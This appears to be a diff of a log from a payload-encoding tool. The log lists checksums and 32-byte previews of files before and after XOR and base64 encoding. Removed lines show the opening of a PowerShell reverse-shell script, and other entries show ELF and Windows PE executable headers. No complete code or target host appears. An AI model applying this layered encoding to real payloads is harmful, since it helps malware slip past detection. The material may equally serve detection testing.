@@ -1,206 +1,206 @@
 This is the checksum of the file before encoding is applied from log number: 0 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 0 log subnumber: 0
-96cd2ad4a85660834726f653f552592d 
- b'T\x13\x1c\x19\x15\x1e\x04PMP+>\x15\x04^#\x1f\x13\x1b\x15\x04\x03^$\x13\x003\x1c\x19\x15\x1e\x04' 
+04a7fcd1a4c624183314b6adbc861229 
+ b'{AHB\x06\x05\x05\x04\x04\x04\x04\x04\x04\x04\x04\x04\x07\x04:\x04\x05\x04\x04\x04d\x15\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 0 log subnumber: 0
-3cb5cd3ab7b7ba4682412c65262debe8 
- b'VBMcGRUeBFBNUCs+FQReIx8TGxUEA14k' 
+f7c6b324db7bd5939209f33ba4c2bd49 
+ b'e0FIQgYFBQQEBAQEBAQEBAcEOgQFBAQE' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 0 log subnumber: 0
-96cd2ad4a85660834726f653f552592d 
- b'T\x13\x1c\x19\x15\x1e\x04PMP+>\x15\x04^#\x1f\x13\x1b\x15\x04\x03^$\x13\x003\x1c\x19\x15\x1e\x04' 
+04a7fcd1a4c624183314b6adbc861229 
+ b'{AHB\x06\x05\x05\x04\x04\x04\x04\x04\x04\x04\x04\x04\x07\x04:\x04\x05\x04\x04\x04d\x15\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 0 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 0 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 0 log subnumber: 1
-283e22cdba800fddcf68f86d50242525 
- b'=*\xe0psppptppp\x8f\x8fpp\xc8ppppppp0ppppppp' 
+8d385541460c98c0bd540532cc9f0fab 
+ b'I^\x94\x04\x07\x04\x04\x04\x00\x04\x04\x04\xfb\xfb\x04\x04\xbc\x04\x04\x04\x04\x04\x04\x04D\x04\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 0 log subnumber: 1
-581eb8d8cd58ba271da75a841a8b4d5f 
- b'PSrgcHNwcHB0cHBwj49wcMhwcHBwcHBw' 
+7f3489f743ec8ae9b5588151870827f6 
+ b'SV6UBAcEBAQABAQE+/sEBLwEBAQEBAQE' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 0 log subnumber: 1
-283e22cdba800fddcf68f86d50242525 
- b'=*\xe0psppptppp\x8f\x8fpp\xc8ppppppp0ppppppp' 
+8d385541460c98c0bd540532cc9f0fab 
+ b'I^\x94\x04\x07\x04\x04\x04\x00\x04\x04\x04\xfb\xfb\x04\x04\xbc\x04\x04\x04\x04\x04\x04\x04D\x04\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 0 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 1 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 1 log subnumber: 0
-116f75f38a19c23d64fba4fc02ac31b7 
- b'E\x02\r\x08\x04\x0f\x15A\\A:/\x04\x15O2\x0e\x02\n\x04\x15\x12O5\x02\x11"\r\x08\x04\x0f\x15' 
+760f57c3354abe28fee186397866fcc0 
+ b'\xb5\x8f\x86\x8c\xc8\xcb\xcb\xca\xca\xca\xca\xca\xca\xca\xca\xca\xc9\xca\xf4\xca\xcb\xca\xca\xca\xaa\xdb\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 1 log subnumber: 0
-05538c1967517583298aa26fb64559de 
- b'RQINCAQPFUFcQTovBBVPMg4CCgQVEk81' 
+dc1b33cf7b9bbafa0af7394ea6914aa6 
+ b'tY+GjMjLy8rKysrKysrKysnK9MrLysrK' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 1 log subnumber: 0
-116f75f38a19c23d64fba4fc02ac31b7 
- b'E\x02\r\x08\x04\x0f\x15A\\A:/\x04\x15O2\x0e\x02\n\x04\x15\x12O5\x02\x11"\r\x08\x04\x0f\x15' 
+760f57c3354abe28fee186397866fcc0 
+ b'\xb5\x8f\x86\x8c\xc8\xcb\xcb\xca\xca\xca\xca\xca\xca\xca\xca\xca\xc9\xca\xf4\xca\xcb\xca\xca\xca\xaa\xdb\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 1 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 1 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 1 log subnumber: 1
-63978c8054377ddbc0e2cc1bcdaa8986 
- b',;\xf1abaaaeaaa\x9e\x9eaa\xd9aaaaaaa!aaaaaaa' 
+eac2eb141772a78884950482c675ae6f 
+ b'\x87\x90Z\xca\xc9\xca\xca\xca\xce\xca\xca\xca55\xca\xcar\xca\xca\xca\xca\xca\xca\xca\x8a\xca\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 1 log subnumber: 1
-b8f09e42ccfa5ffcb736f479cccef7bb 
- b'LDvxYWJhYWFlYWFhnp5hYdlhYWFhYWFh' 
+0afbfb20204e0dcbdd82028448354613 
+ b'h5BaysnKysrOysrKNTXKynLKysrKysrK' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 1 log subnumber: 1
-63978c8054377ddbc0e2cc1bcdaa8986 
- b',;\xf1abaaaeaaa\x9e\x9eaa\xd9aaaaaaa!aaaaaaa' 
+eac2eb141772a78884950482c675ae6f 
+ b'\x87\x90Z\xca\xc9\xca\xca\xca\xce\xca\xca\xca55\xca\xcar\xca\xca\xca\xca\xca\xca\xca\x8a\xca\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 1 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 2 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 2 log subnumber: 0
-9b25be8ba06c45837e39541fc2678d10 
- b'\x12UZ_SXB\x16\x0b\x16mxSB\x18eYU]SBE\x18bUFuZ_SXB' 
+f3faccfca8e175ed8ab7d66f8beeee07 
+ b'\xf1\xcb\xc2\xc8\x8c\x8f\x8f\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8d\x8e\xb0\x8e\x8f\x8e\x8e\x8e\xee\x9f\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 2 log subnumber: 0
-02eba676446abd9764f44640c2c77527 
- b'ElVaX1NYQhYLFm14U0IYZVlVXVNCRRhi' 
+02218e080021c90fdb15ba26dc1b5dc5 
+ b'8cvCyIyPj46Ojo6Ojo6Ojo2OsI6Pjo6O' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 2 log subnumber: 0
-9b25be8ba06c45837e39541fc2678d10 
- b'\x12UZ_SXB\x16\x0b\x16mxSB\x18eYU]SBE\x18bUFuZ_SXB' 
+f3faccfca8e175ed8ab7d66f8beeee07 
+ b'\xf1\xcb\xc2\xc8\x8c\x8f\x8f\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8d\x8e\xb0\x8e\x8f\x8e\x8e\x8e\xee\x9f\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 2 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 2 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 2 log subnumber: 1
-ab6a474ec62fe11e4cf7fef850901a5c 
- b'{l\xa6656662666\xc9\xc966\x8e6666666v6666666' 
+b5266e24800da3d035f8bd97acae7686 
+ b'\xc3\xd4\x1e\x8e\x8d\x8e\x8e\x8e\x8a\x8e\x8e\x8eqq\x8e\x8e6\x8e\x8e\x8e\x8e\x8e\x8e\x8e\xce\x8e\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 2 log subnumber: 1
-6e9c905b1004025b4921d03ca3b3e6f3 
- b'e2ymNjU2NjYyNjY2yck2No42NjY2NjY2' 
+4b8196a2616d092b2289116d0ce79e5b 
+ b'w9Qejo2Ojo6Kjo6OcXGOjjaOjo6Ojo6O' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 2 log subnumber: 1
-ab6a474ec62fe11e4cf7fef850901a5c 
- b'{l\xa6656662666\xc9\xc966\x8e6666666v6666666' 
+b5266e24800da3d035f8bd97acae7686 
+ b'\xc3\xd4\x1e\x8e\x8d\x8e\x8e\x8e\x8a\x8e\x8e\x8eqq\x8e\x8e6\x8e\x8e\x8e\x8e\x8e\x8e\x8e\xce\x8e\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 2 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 3 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 3 log subnumber: 0
-27b28215d34b003e248cbde75d8334ab 
- b'[\x1c\x13\x16\x1a\x11\x0b_B_$1\x1a\x0bQ,\x10\x1c\x14\x1a\x0b\x0cQ+\x1c\x0f<\x13\x16\x1a\x11\x0b' 
+972cd9de04a5a66fb71a4bb2542d7336 
+ b'\x11+"(loonnnnnnnnnmnPnonnn\x0e\x7fnnnnnn' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 3 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 3 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 3 log subnumber: 1
-328fdaa3cbb470a35328551802d34f12 
- b'2%\xef\x7f|\x7f\x7f\x7f{\x7f\x7f\x7f\x80\x80\x7f\x7f\xc7\x7f\x7f\x7f\x7f\x7f\x7f\x7f?\x7f\x7f\x7f\x7f\x7f\x7f\x7f' 
+d49ca0be640fc241d2dc2b45835668cd 
+ b'#4\xfenmnnnjnnn\x91\x91nn\xd6nnnnnnn.nnnnnnn' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 3 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 4 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 4 log subnumber: 0
-035973fa7c2a69c3abd0bbb7777e0d9e 
- b'\x8b\xcc\xc3\xc6\xca\xc1\xdb\x8f\x92\x8f\xf4\xe1\xca\xdb\x81\xfc\xc0\xcc\xc4\xca\xdb\xdc\x81\xfb\xcc\xdf\xec\xc3\xc6\xca\xc1\xdb' 
+a000d021bad66a684bb2ef7c6c70859e 
+ b'(\x12\x1b\x11UVVWWWWWWWWWTWiWVWWW7FWWWWWW' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 4 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 4 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 4 log subnumber: 1
-899447f6fc049b6738b8c4e3fabebadc 
- b'\xe2\xf5?\xaf\xac\xaf\xaf\xaf\xab\xaf\xaf\xafPP\xaf\xaf\x17\xaf\xaf\xaf\xaf\xaf\xaf\xaf\xef\xaf\xaf\xaf\xaf\xaf\xaf\xaf' 
+3de2eb47db94be32f40d05093589ca96 
+ b'\x1a\r\xc7WTWWWSWWW\xa8\xa8WW\xefWWWWWWW\x17WWWWWWW' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 4 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 5 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 5 log subnumber: 0
-af07b8cc4bc4932cd0af6f969f28c936 
- b'I\x0e\x01\x04\x08\x03\x19MPM6#\x08\x19C>\x02\x0e\x06\x08\x19\x1eC9\x0e\x1d.\x01\x04\x08\x03\x19' 
+90a4e5485c437c20333e936bde0eb7fe 
+ b'\x89\xb3\xba\xb0\xf4\xf7\xf7\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf5\xf6\xc8\xf6\xf7\xf6\xf6\xf6\x96\xe7\xf6\xf6\xf6\xf6\xf6\xf6' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 5 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 5 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 5 log subnumber: 1
-5c52f660c95a57db4300758cc1ac4a34 
- b' 7\xfdmnmmmimmm\x92\x92mm\xd5mmmmmmm-mmmmmmm' 
+eb9e7cc63f1b0ec45dff4b2fa243f011 
+ b'\xbb\xacf\xf6\xf5\xf6\xf6\xf6\xf2\xf6\xf6\xf6\t\t\xf6\xf6N\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xb6\xf6\xf6\xf6\xf6\xf6\xf6\xf6' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 5 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 6 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 6 log subnumber: 0
-594eb02a8d4721ad6f441155a790165c 
- b'JGNsaWVudCA9IFtOZXQuU29ja2V0cy5U' 
+47c03856c3187fdab3a0f42e6aa9a903 
+ b'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 6 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 6 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
@@ -215,208 +215,208 @@ This is the checksum of what is preserved after applying base64 to the payload (
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 7 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 7 log subnumber: 0
-96cd2ad4a85660834726f653f552592d 
- b'T\x13\x1c\x19\x15\x1e\x04PMP+>\x15\x04^#\x1f\x13\x1b\x15\x04\x03^$\x13\x003\x1c\x19\x15\x1e\x04' 
+04a7fcd1a4c624183314b6adbc861229 
+ b'{AHB\x06\x05\x05\x04\x04\x04\x04\x04\x04\x04\x04\x04\x07\x04:\x04\x05\x04\x04\x04d\x15\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 7 log subnumber: 0
-3cb5cd3ab7b7ba4682412c65262debe8 
- b'VBMcGRUeBFBNUCs+FQReIx8TGxUEA14k' 
+f7c6b324db7bd5939209f33ba4c2bd49 
+ b'e0FIQgYFBQQEBAQEBAQEBAcEOgQFBAQE' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 7 log subnumber: 0
-96cd2ad4a85660834726f653f552592d 
- b'T\x13\x1c\x19\x15\x1e\x04PMP+>\x15\x04^#\x1f\x13\x1b\x15\x04\x03^$\x13\x003\x1c\x19\x15\x1e\x04' 
+04a7fcd1a4c624183314b6adbc861229 
+ b'{AHB\x06\x05\x05\x04\x04\x04\x04\x04\x04\x04\x04\x04\x07\x04:\x04\x05\x04\x04\x04d\x15\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 7 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 7 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 7 log subnumber: 1
-283e22cdba800fddcf68f86d50242525 
- b'=*\xe0psppptppp\x8f\x8fpp\xc8ppppppp0ppppppp' 
+8d385541460c98c0bd540532cc9f0fab 
+ b'I^\x94\x04\x07\x04\x04\x04\x00\x04\x04\x04\xfb\xfb\x04\x04\xbc\x04\x04\x04\x04\x04\x04\x04D\x04\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 7 log subnumber: 1
-581eb8d8cd58ba271da75a841a8b4d5f 
- b'PSrgcHNwcHB0cHBwj49wcMhwcHBwcHBw' 
+7f3489f743ec8ae9b5588151870827f6 
+ b'SV6UBAcEBAQABAQE+/sEBLwEBAQEBAQE' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 7 log subnumber: 1
-283e22cdba800fddcf68f86d50242525 
- b'=*\xe0psppptppp\x8f\x8fpp\xc8ppppppp0ppppppp' 
+8d385541460c98c0bd540532cc9f0fab 
+ b'I^\x94\x04\x07\x04\x04\x04\x00\x04\x04\x04\xfb\xfb\x04\x04\xbc\x04\x04\x04\x04\x04\x04\x04D\x04\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 7 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 8 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 8 log subnumber: 0
-116f75f38a19c23d64fba4fc02ac31b7 
- b'E\x02\r\x08\x04\x0f\x15A\\A:/\x04\x15O2\x0e\x02\n\x04\x15\x12O5\x02\x11"\r\x08\x04\x0f\x15' 
+760f57c3354abe28fee186397866fcc0 
+ b'\xb5\x8f\x86\x8c\xc8\xcb\xcb\xca\xca\xca\xca\xca\xca\xca\xca\xca\xc9\xca\xf4\xca\xcb\xca\xca\xca\xaa\xdb\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 8 log subnumber: 0
-05538c1967517583298aa26fb64559de 
- b'RQINCAQPFUFcQTovBBVPMg4CCgQVEk81' 
+dc1b33cf7b9bbafa0af7394ea6914aa6 
+ b'tY+GjMjLy8rKysrKysrKysnK9MrLysrK' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 8 log subnumber: 0
-116f75f38a19c23d64fba4fc02ac31b7 
- b'E\x02\r\x08\x04\x0f\x15A\\A:/\x04\x15O2\x0e\x02\n\x04\x15\x12O5\x02\x11"\r\x08\x04\x0f\x15' 
+760f57c3354abe28fee186397866fcc0 
+ b'\xb5\x8f\x86\x8c\xc8\xcb\xcb\xca\xca\xca\xca\xca\xca\xca\xca\xca\xc9\xca\xf4\xca\xcb\xca\xca\xca\xaa\xdb\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 8 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 8 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 8 log subnumber: 1
-63978c8054377ddbc0e2cc1bcdaa8986 
- b',;\xf1abaaaeaaa\x9e\x9eaa\xd9aaaaaaa!aaaaaaa' 
+eac2eb141772a78884950482c675ae6f 
+ b'\x87\x90Z\xca\xc9\xca\xca\xca\xce\xca\xca\xca55\xca\xcar\xca\xca\xca\xca\xca\xca\xca\x8a\xca\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 8 log subnumber: 1
-b8f09e42ccfa5ffcb736f479cccef7bb 
- b'LDvxYWJhYWFlYWFhnp5hYdlhYWFhYWFh' 
+0afbfb20204e0dcbdd82028448354613 
+ b'h5BaysnKysrOysrKNTXKynLKysrKysrK' 
 
